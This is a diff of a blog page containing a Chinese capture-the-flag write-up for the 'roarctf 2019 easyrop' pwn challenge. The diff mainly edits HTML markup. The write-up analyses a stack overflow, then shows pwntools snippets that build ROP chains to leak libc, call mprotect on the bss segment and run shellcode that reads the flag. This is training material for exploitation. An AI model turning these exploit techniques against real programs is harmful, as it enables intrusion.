@@ -15,7 +15,7 @@
   
   <link rel="canonical" href="http://mykonos-x.github.io/2023/10/04/roarctf-2019-easyrop/">
   
-  <meta name="description" content="Analyse 既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, cha">
+  <meta name="description" content="Analyse  既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, ch">
   
   
   <meta name="author" content="Ez3ki3l">
@@ -26,14 +26,14 @@
   <meta property="og:type" content="article" />
   <meta property="og:title" content="roarctf 2019 easyrop" />
   
-  <meta property="og:description" content="Analyse 既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, cha">
+  <meta property="og:description" content="Analyse  既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, ch">
   
   <meta property="og:url" content="http://mykonos-x.github.io/2023/10/04/roarctf-2019-easyrop/" />
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="roarctf 2019 easyrop">
   
-  <meta name="twitter:description" content="Analyse 既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, cha">
+  <meta name="twitter:description" content="Analyse  既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, ch">
   
   
   
@@ -193,9 +193,10 @@
         <div class="trans">
             <h2>roarctf 2019 easyrop</h2>
 
-  <h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p><img src="https://pic.imgdb.cn/item/651d4f2ec458853aefa41683.jpg" alt=""></p>
+  <h3><span id="analyse">Analyse</span></h3>
+<p><img src="https://pic.imgdb.cn/item/651d4f2ec458853aefa41683.jpg" alt></p>
 <p>既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行</p>
-<p><img src="https://pic.imgdb.cn/item/651d5388c458853aefa497b7.jpg" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/651d5388c458853aefa497b7.jpg" alt></p>
 <p>可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看</p>
 <p>main函数</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
@@ -298,8 +299,9 @@
 <li><code>struct stat *buf</code> 指向<code>struct stat</code>结构的指针，该文件用于保存文件的状态信息</li>
 </ul>
 <p>所以大概知道这个程序是对文件信息进行查看，用户输入应该是输入文件的路径</p>
-<p><img src="https://pic.imgdb.cn/item/651d4f92c458853aefa4202a.jpg" alt=""></p>
-<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>一般的rop都要结合栈溢，但是这里接收用户输入是使用的<code>fgetc()</code>，也不是那么一眼丁真</p>
+<p><img src="https://pic.imgdb.cn/item/651d4f92c458853aefa4202a.jpg" alt></p>
+<h4><span id="漏洞点">漏洞点</span></h4>
+<p>一般的rop都要结合栈溢，但是这里接收用户输入是使用的<code>fgetc()</code>，也不是那么一眼丁真</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
   v8 <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -329,8 +331,11 @@ v6<span class="token punctuation">[</span>v9<span class="token punctuation">]</s
 +0000000000000010
 +0000000000000010 ; end of stack variables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以发现，由于没有对v6这个变量的长度进行限制，所以这里是可以溢出的，通过v6我们可以覆盖到返回地址，从而rop</p>
-<h4 id="构造ropchain"><a href="#构造ropchain" class="headerlink" title="构造ropchain"></a>构造ropchain</h4><h5 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h5><p>这里需要注意的是，在栈上往下覆盖时，路径上还存有其他变量，我们要尽量保证覆盖的数据不会导致程序异常退出。查看发现这里的v8其实就是上方提到的<code>v6[v9] = 0</code>中的index =&gt; v9，根据经验这里肯定不能覆盖掉索引，<del>看了另一个师傅的wp，这里的索引需要覆盖为0x28(40)，暂时还不知道为什么，哭</del></p>
-<h5 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h5><p>接下来就是愉快的rop了，程序有puts函数，那么选用puts来泄露libc基址，最后再控制返回地址回到main函数，进行多次利用</p>
+<h4><span id="构造ropchain">构造ropchain</span></h4>
+<h5><span id="tips">tips</span></h5>
+<p>这里需要注意的是，在栈上往下覆盖时，路径上还存有其他变量，我们要尽量保证覆盖的数据不会导致程序异常退出。查看发现这里的v8其实就是上方提到的<code>v6[v9] = 0</code>中的index =&gt; v9，根据经验这里肯定不能覆盖掉索引，<s>看了另一个师傅的wp，这里的索引需要覆盖为0x28(40)，暂时还不知道为什么，哭</s></p>
+<h5><span id="泄露libc基址">泄露libc基址</span></h5>
+<p>接下来就是愉快的rop了，程序有puts函数，那么选用puts来泄露libc基址，最后再控制返回地址回到main函数，进行多次利用</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>
     ret<span class="token punctuation">,</span>
     pop_rdi<span class="token punctuation">,</span>
@@ -339,9 +344,11 @@ v6<span class="token punctuation">[</span>v9<span class="token punctuation">]</s
     <span class="token number">0x4019F3</span>
 <span class="token punctuation">]</span>
 io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x418</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>拿到libc基址后，尝试通过system()调用/bin/sh发现无果，原因是使用seccomp-tools查看，该程序禁用了execve系统调用，而system()函数底层需要间接调用execve()或者exec系列函数，故此方法不可行了</p>
+<h4><span id="shellcode">shellcode</span></h4>
+<p>拿到libc基址后，尝试通过system()调用/bin/sh发现无果，原因是使用seccomp-tools查看，该程序禁用了execve系统调用，而system()函数底层需要间接调用execve()或者exec系列函数，故此方法不可行了</p>
 <p>这里记录一个学到的做法：构造rop，将用户输入再下一次输入的内容定位到bss段上，再通过mprotect将该bss段赋予可读可写可执行权限，下一次输入时输入shellcode，从而在bss段上执行了这段shellcode，这道题的话就是读取flag</p>
-<h5 id="构造ropchain-1"><a href="#构造ropchain-1" class="headerlink" title="构造ropchain"></a>构造ropchain</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+<h5><span id="构造ropchain">构造ropchain</span></h5>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>
     pop_rdi<span class="token punctuation">,</span> <span class="token comment"># : pop rdi ; ret</span>
     elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
 
@@ -372,10 +379,11 @@ libc_base <span class="token operator">+</span> libc<span class="token punctuati
 <p>7是mprotect()函数的prot参数的值，在二进制中，7为111，表示<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>可读可写可执行</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">elf<span class="token punctuation">.</span><span class="token function">bss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>最后跳转到bss段</p>
-<h5 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h5><p>接着，现在在等待用户输入了( gets() )，我们生成shellcode进行cat flag，发送即可</p>
+<h5><span id="生成shellcode">生成shellcode</span></h5>
+<p>接着，现在在等待用户输入了( gets() )，我们生成shellcode进行cat flag，发送即可</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://pic.imgdb.cn/item/651d5cebc458853aefa95a79.jpg" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/651d5cebc458853aefa95a79.jpg" alt></p>
 
   <p><a class="classtest-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="classtest-link" href="/tags/write-up/" rel="tag">write-up</a> — Oct 4, 2023</p>
   
